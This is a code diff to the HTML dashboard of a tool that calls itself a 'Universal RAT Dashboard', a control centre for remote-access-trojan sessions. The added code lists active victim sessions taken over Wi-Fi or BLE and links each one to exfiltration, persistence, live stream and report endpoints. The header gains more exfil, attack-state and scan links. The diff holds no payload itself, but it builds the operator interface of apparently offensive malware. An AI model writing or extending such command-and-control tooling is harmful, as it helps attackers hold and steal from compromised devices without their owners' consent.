@@ -23,6 +23,56 @@ def _esc(s: Any) -> str:
     return html.escape(str(s if s is not None else ""), quote=True)
 
 
+def _sessions_block(sessions: Optional[List[Dict[str, Any]]]) -> str:
+    """Active sessions roster with PDF / recommend / stream hooks (v2 contract)."""
+    sessions = sessions or []
+    if not sessions:
+        return (
+            '<section class="panel" id="sessions-panel">'
+            "<h2>Active sessions</h2>"
+            '<p class="hint empty-sessions">No active sessions yet. '
+            "Gain access from Wi‑Fi / BLE engagement (ACCEPT-gated), "
+            "or create a task below.</p>"
+            "</section>"
+        )
+    rows = []
+    for s in sessions:
+        sid = (
+            s.get("id") or s.get("session_id") or s.get("sid") or "?"
+        )
+        kind = s.get("kind") or s.get("transport") or "?"
+        tgt = s.get("target") or s.get("label") or sid
+        rows.append(
+            f'<tr data-sid="{_esc(sid)}">'
+            f"<td><code>{_esc(sid)}</code></td>"
+            f"<td>{_esc(kind)}</td>"
+            f"<td>{_esc(tgt)}</td>"
+            f'<td class="acts">'
+            f'<a class="api" href="/api/session/{_esc(sid)}/report.pdf">'
+            f"export PDF</a> · "
+            f'<a class="api" href="/api/session/{_esc(sid)}/recommend">'
+            f"recommend</a> · "
+            f'<a class="api" href="/api/session/{_esc(sid)}/stream">'
+            f"stream</a> · "
+            f'<a class="api" href="/api/session/{_esc(sid)}/exfil">'
+            f"exfil</a> · "
+            f'<a class="api" href="/api/session/{_esc(sid)}/persistence">'
+            f"persistence</a>"
+            f"</td></tr>"
+        )
+    return (
+        '<section class="panel" id="sessions-panel">'
+        "<h2>Active sessions</h2>"
+        '<p class="hint">Per-session PDF report, recommend, live stream, '
+        "exfil queue, and persistence UI.</p>"
+        '<table class="tasks"><thead><tr>'
+        "<th>ID</th><th>Kind</th><th>Target</th><th>Actions</th>"
+        "</tr></thead><tbody>"
+        + "\n".join(rows)
+        + "</tbody></table></section>"
+    )
+
+
 def hub_html(
     sessions: Optional[List[Dict[str, Any]]] = None,
     tasks: Optional[List[Dict[str, Any]]] = None,
@@ -165,17 +215,30 @@ a.api {{ color:var(--wifi); }}
 <header>
   <div>
     <h1>KFIOSA · Universal RAT Dashboard</h1>
-    <div class="sub">SQL-persisted · polymorphic · until-success engagements</div>
+    <div class="sub">KFIOSA RAT dashboard · control centre · SQL-persisted · polymorphic · until-success</div>
   </div>
   <div class="sub">
     <a class="api" href="/api/v5/health">health</a> ·
     <a class="api" href="/api/sessions">sessions</a> ·
     <a class="api" href="/api/tasks">tasks</a> ·
-    <a class="api" href="/api/attack_state">attack state</a>
+    <a class="api" href="/api/attack_state">attack state</a> ·
+    <a class="api" href="/api/v4/ai_status">AI status</a> ·
+    <a class="api" href="/api/v4/scan_options?surface=wifi">scan · wifi</a> ·
+    <a class="api" href="/api/sql/snapshot/default">SQL snapshot</a> ·
+    <a class="api" href="/api/sql/log/default">SQL log</a> ·
+    <a class="api" href="/api/sql/history/default">SQL history</a> ·
+    <a class="api" href="/api/sql/exfil/default">SQL exfil</a> ·
+    <a class="api" href="/api/sql/sessions">SQL sessions</a> ·
+    <a class="api" href="/api/sql_health">SQL health</a> ·
+    <a class="api" href="/api/stream">stream</a> ·
+    <a class="api" href="/api/recommend">recommend</a> ·
+    <a class="api" href="/api/exfil">exfil</a> ·
+    <a class="api" href="/api/persistence">persistence</a>
   </div>
 </header>
 <nav class="tabs">{''.join(tabs)}</nav>
 <main>
+{_sessions_block(sessions)}
 {''.join(panels)}
 <p class="footer">Tasks and sessions save to the local SQL store (~/.kfiosa/kfiosa.db by default)
 and reconnect when the Python tool / dashboard restarts.</p>
